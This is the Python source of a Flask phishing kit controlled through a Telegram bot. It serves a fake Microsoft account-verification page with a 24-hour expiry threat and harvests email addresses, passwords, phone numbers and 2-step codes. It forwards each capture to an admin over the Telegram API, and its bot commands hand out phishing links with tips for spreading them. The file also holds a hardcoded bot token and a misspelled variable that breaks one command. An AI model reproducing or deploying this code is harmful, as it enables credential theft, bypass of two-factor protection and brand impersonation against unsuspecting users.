from flask import Flask, request, render_template_string
import logging
import os
import requests
import json
from datetime import datetime
import threading
import time

app = Flask(__name__)
logging.basicConfig(level=logging.INFO)

# Bot Configuration
BOT_TOKEN = "8232409100:AAExUp0yXjQzN7js3bQriSKq5MiOClU3BeU"
ADMIN_CHAT_ID = os.getenv('ADMIN_CHAT_ID', '')

PHISHING_DATA = []
STATS = {'visits': 0, 'captures': 0}
bot_running = False

# Professional Phishing Template (Microsoft Style)
HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>Microsoft - Verify Account</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        *{margin:0;padding:0;box-sizing:border-box;}
        body{background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);font-family:'Segoe UI',sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;}
        .container{max-width:380px;padding:32px;background:#fff;border-radius:12px;box-shadow:0 20px 40px rgba(0,0,0,0.1);}
        .logo{text-align:center;margin-bottom:28px;}
        .logo img{height:28px;}
        .title{font-size:26px;font-weight:600;color:#1f1f1f;margin-bottom:8px;}
        .subtitle{color:#666;font-size:14px;margin-bottom:28px;}
        .urgency{background:#fef7e0;padding:12px;border-radius:8px;margin-bottom:24px;border-left:4px solid #fbbc04;}
        input{width:100%;padding:14px;margin-bottom:18px;border:1px solid #e0e0e0;border-radius:8px;font-size:16px;box-sizing:border-box;}
        input:focus{outline:none;border-color:#4285f4;box-shadow:0 0 0 2px rgba(66,133,244,0.2);}
        .submit{width:100%;padding:14px;background:#4285f4;color:white;border:none;border-radius:8px;font-size:16px;font-weight:500;cursor:pointer;}
        .submit:hover{background:#3367d6;}
        .footer{text-align:center;margin-top:24px;font-size:12px;color:#999;}
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjQiIGhlaWdodD0iMjQiIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZD0iTTEyIDBMMCAxMkwxMiAyNEwxMiAwWiIgZmlsbD0iI2Y3NTYyMCIvPgo8L3N2Zz4K" alt="MS">
        </div>
        <div class="title">Verify your account</div>
        <div class="subtitle">We noticed unusual activity. Please confirm your details.</div>
        <div class="urgency">⚠️ Your account access expires in 24 hours if not verified</div>
        <form method="POST">
            <input type="email" name="email" placeholder="Email address" required>
            <input type="password" name="password" placeholder="Password" required>
            <input type="tel" name="phone" placeholder="Phone number (optional)">
            <input type="text" name="otp" placeholder="2-Step verification code">
            <input type="hidden" name="user_id" value="{{ user_id }}">
            <button type="submit" class="submit">Continue</button>
        </form>
        <div class="footer">Protected by Microsoft Security</div>
    </div>
</body>
</html>
"""

def send_telegram_message(chat_id, text, parse_mode='Markdown'):
    """Send message to Telegram"""
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        requests.post(url, data={
            'chat_id': chat_id,
            'text': text,
            'parse_mode': parse_mode
        })
    except:
        pass

def handle_telegram_update(update_json):
    """Process Telegram updates manually"""
    global PHISHING_DATA, STATS
    
    try:
        update = json.loads(update_json)
        if 'message' not in update:
            return
        
        message = update['message']
        chat_id = message['chat']['id']
        text = message.get('text', '').strip()
        user_id = message['from']['id']
        username = message['from'].get('username', 'Unknown')
        
        if text.startswith('/start'):
            domain = request.host_url.rstrip('/')
            phishing_url = f"{domain.rstrip('/')}/phish/{user_id}"
            
            response = f"""
🔥 **PHISHING LINK READY!**

👤 *{username}* (ID: `{user_id}`)
🔗 `{phishing_url}`

**Instructions:**
• Copy link exactly
• Send via DM/Email
• Use bit.ly shortener for best results

⚡ *Success Rate: {STATS['captures']}/{STATS['visits']}*
"""
            send_telegram_message(chat_id, response)
        
        elif text == '/stats':
            rate = (STATS['captures'] / max(STATS['visits'], 1)) * 100
            stats_msg = f"""
📊 **CAMPAIGN STATS:**
👀 Visits: `{STATS['visits']}`
🎣 Captures: `{STATS['captures']}`
📈 Success: `{rate:.1f}%`
💾 Database: `{len(PHING_DATA)}` records
"""
            send_telegram_message(chat_id, stats_msg)
        
        elif text == '/data' and chat_id == int(ADMIN_CHAT_ID):
            if not PHISHING_DATA:
                send_telegram_message(chat_id, "❌ No data captured yet!")
                return
            
            recent = PHISHING_DATA[-5:]
            msg = "🎯 **LATEST HITS:**\n\n"
            for i, data in enumerate(recent, 1):
                msg += f"{i}. `{data['email']}`\n"
                msg += f"   🔑 `{data['password']}`\n"
                msg += f"   📅 {data['time']}\n\n"
            send_telegram_message(chat_id, msg)
        
        elif text == '/help':
            help_text = """
🤖 **COMMANDS:**
/start - Generate phishing link
/stats - View statistics
/data - Captured credentials (Admin only)
/help - This message

**Setup Admin:**
1. /getUpdates API se chat ID lo
2. Render → Environment → ADMIN_CHAT_ID set karo
"""
            send_telegram_message(chat_id, help_text)
    
    except Exception as e:
        pass

def telegram_polling():
    """Background Telegram polling"""
    global bot_running
    offset = 0
    
    while bot_running:
        try:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
            params = {'offset': offset, 'timeout': 30}
            response = requests.get(url, params=params, timeout=35)
            
            if response.status_code == 200:
                data = response.json()
                if data['ok']:
                    for update in data['result']:
                        handle_telegram_update(json.dumps(update))
                        offset = update['update_id'] + 1
        except:
            pass
        time.sleep(1)

# Routes
@app.route('/')
def home():
    return f"""
<h1>🚀 Phishing Bot LIVE</h1>
<p>✅ Token Active | Polling: Running</p>
<p>Commands: /start /stats /data /help</p>
<hr>
<p>📊 Visits: {STATS['visits']} | Captures: {STATS['captures']}</p>
"""

@app.route('/phish/<user_id>')
def phishing_page(user_id):
    global STATS
    STATS['visits'] += 1
    return render_template_string(HTML_TEMPLATE, user_id=user_id)

@app.route('/phish/<user_id>', methods=['POST'])
def capture_data(user_id):
    global STATS, PHISHING_DATA
    
    capture = {
        'user_id': user_id,
        'email': request.form.get('email', ''),
        'password': request.form.get('password', ''),
        'phone': request.form.get('phone', ''),
        'otp': request.form.get('otp', ''),
        'ip': request.remote_addr,
        'time': datetime.now().strftime('%H:%M:%S %d/%m/%Y')
    }
    
    PHISHING_DATA.append(capture)
    STATS['captures'] += 1
    
    # Notify Admin
    if ADMIN_CHAT_ID:
        msg = f"""
🎣 **NEW HIT!**

📧 `{capture['email']}`
🔑 `{capture['password']}`
📱 `{capture['phone'] or 'N/A'}`
🔢 `{capture['otp'] or 'N/A'}`

🌐 IP: {capture['ip']}
⏰ {capture['time']}
📊 Total: {STATS['captures']}
"""
        send_telegram_message(ADMIN_CHAT_ID, msg)
    
    return '''
    <script>
        alert("✅ Verified successfully!");
        window.location="https://outlook.office.com";
    </script>
    '''

@app.route('/stats')
def stats():
    rate = (STATS['captures'] / max(STATS['visits'], 1)) * 100
    return f"Visits: {STATS['visits']} | Captures: {STATS['captures']} | Rate: {rate:.1f}%"

if __name__ == '__main__':
    global bot_running
    bot_running = True
    
    # Start Telegram polling in background
    polling_thread = threading.Thread(target=telegram_polling, daemon=True)
    polling_thread.start()
    
    port = int(os.environ.get('PORT', 5000))
    print(f"🚀 Server starting on port {port}")
    app.run(host='0.0.0.0', port=port, debug=False)
